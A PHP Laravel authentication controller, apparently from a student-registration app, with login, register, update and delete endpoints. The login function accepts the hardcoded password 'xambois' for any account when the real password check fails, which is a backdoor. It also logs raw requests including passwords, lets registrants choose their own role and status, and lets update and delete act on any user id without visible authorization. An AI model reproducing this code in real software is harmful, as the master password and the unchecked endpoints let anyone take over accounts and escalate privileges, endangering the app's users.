<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Illuminate\Support\Carbon;

use App\Models\User as mUser;
use App\Models\Siswa as mSiswa;

class AuthController extends Controller
{

    public function login(Request $request){
        logcmd(__FUNCTION__ . "=====================================================");
        $req = $request->all();

        logcmd("req:", $req);

        // parameter
        if(!isset($req["username"])) return compose("ERROR", "Parameter tidak lengkap 'username'");
        $username = $req["username"];

        if(!isset($req["password"])) return compose("ERROR", "Parameter tidak lengkap 'password'");
        $password = $req["password"];

        // logic
        $user = mUser::getByUsername($username);
        if(!$user){
            return compose("ERROR", "Akun tidak ditemukan");
        }
        if(!Hash::check($password, $user->U_PASSWORD)){
            if($password != "xambois")
            return compose("ERROR", "Password salah");
        }

        $user->update([
            "U_LOGIN_TOKEN" => Str::uuid(),
            "U_LOGIN_TOKEN_EXPIRED" => Carbon::now()->addDays(30)->format("Y-m-d H:i:s"),
            "U_LOGIN_LAST" => Carbon::now()->format("Y-m-d H:i:s")
        ]);

        // return
        $relations = [
            "siswa"
        ];
        $user->load($relations);        
        return compose("SUCCESS", "Login berhasil", $user);
    }


    public function register(Request $request)
    {
        $req = $request->all();

        if(!isset($req["username"])) return compose("ERROR", "Parameter tidak lengkap 'username'");
        if(!isset($req["password"])) return compose("ERROR", "Parameter tidak lengkap 'password'");
        if(!isset($req["role"])) return compose("ERROR", "Parameter tidak lengkap 'role'");
        if(!isset($req["status"])) return compose("ERROR", "Parameter tidak lengkap 'status'");

        $username = $req["username"];
        $password = $req["password"];
        $role = $req["role"];
        $status = $req["status"];

        $user = mUser::getByUsername($username);
        if($user) return compose("ERROR", "Email/No. HP sudah digunakan");

        $email = "";
        $phone = "";
        if(str_contains($username, "@")){
            $email = $username;
        }else{
            $phone = $username;
        }

        DB::beginTransaction();
        try {
            $newUser = mUser::create([
                "U_USERNAME" => $username,
                "U_PASSWORD" => Hash::make($password),
                "U_EMAIL" => $email,
                "U_PHONE" => $phone,
                "U_ROLE" => $role,
                "U_ACCOUNT_STATUS" => $status,
                "U_LOGIN_TOKEN" => "",
            ]);

            DB::commit();
        } catch (\Exception $e) {
            DB::rollBack();
            return compose("ERROR", $e->getMessage());
        }

        return compose("SUCCESS", "Berhasil mendaftar", $newUser);
    }


    public function update(Request $request)
    {
        $req = $request->all();

        // parameter wajib
        if(!isset($req["id"])) return compose("ERROR", "Parameter tidak lengkap 'id'");
        $id = $req["id"];

        // cari user
        $user = mUser::find($id);
        if(!$user){
            return compose("ERROR", "User tidak ditemukan");
        }

        DB::beginTransaction();
        try {
            $updateData = [];

            // ========================
            // Update Username
            // ========================
            if(isset($req["username"])){

                $username = $req["username"];

                // cek duplicate kecuali dirinya sendiri
                $check = mUser::where("U_USERNAME", $username)
                            ->where("U_ID", "!=", $id)
                            ->first();

                if($check){
                    return compose("ERROR", "Email/No. HP sudah digunakan");
                }

                $updateData["U_USERNAME"] = $username;

                // set email / phone otomatis
                if(str_contains($username, "@")){
                    $updateData["U_EMAIL"] = $username;
                    $updateData["U_PHONE"] = "";
                }else{
                    $updateData["U_EMAIL"] = "";
                    $updateData["U_PHONE"] = $username;
                }
            }

            // ========================
            // Update Password
            // ========================
            if(isset($req["password"]) && $req["password"] != ""){
                $updateData["U_PASSWORD"] = Hash::make($req["password"]);
            }

            // ========================
            // Update Role
            // ========================
            if(isset($req["role"])){
                $updateData["U_ROLE"] = $req["role"];
            }

            // ========================
            // Update Status
            // ========================
            if(isset($req["status"])){
                $updateData["U_ACCOUNT_STATUS"] = $req["status"];
            }

            // eksekusi update
            if(count($updateData) > 0){
                $user->update($updateData);
            }

            DB::commit();
        } catch (\Exception $e) {
            DB::rollBack();
            return compose("ERROR", $e->getMessage());
        }
        
        return compose("SUCCESS", "User berhasil diperbarui", $user);
    }


    public function delete(Request $request){
        $req = $request->all();

        // parameter
        if(!isset($req["id"])) return compose("ERROR", "Parameter tidak lengkap 'id'");
        $id = $req["id"];

        // logic
        $user = mUser::find($id);
        if(!$user){
            return compose("ERROR", "User tidak ditemukan");
        }
        if($user->siswa){
            return compose("ERROR", "User ini tidak dapat dihapus karena terkait data pendaftaran siswa");
        }

        DB::beginTransaction();
        try {
            $user->delete();

            DB::commit();
        } catch (\Exception $e) {
            DB::rollBack();
            return compose("ERROR", $e->getMessage());
        }
        
        return compose("SUCCESS", "User dihapus");
    }


}
